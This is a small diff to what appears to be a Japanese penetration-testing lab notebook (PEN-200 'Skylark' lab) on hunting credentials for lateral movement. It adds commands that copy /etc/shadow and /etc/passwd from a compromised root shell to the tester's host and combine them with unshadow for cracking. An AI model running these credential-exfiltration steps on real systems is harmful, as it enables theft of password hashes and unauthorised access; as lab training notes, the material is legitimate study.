@@ -1,7 +1,18 @@
 他ユーザーの認証情報など、横展開につかる情報を探す
 
+# Shadow
+
+```
+root@milan:/etc# scp shadow koshi@192.168.45.249:/home/koshi/PEN-200/Skylark/VM15
+root@milan:/etc# scp passwd koshi@192.168.45.249:/home/koshi/PEN-200/Skylark/VM15
+```
+
+```sh
+unshadow passwd shadow > unshadow.txt
+```
 
 
+---
 
 
 # Manual
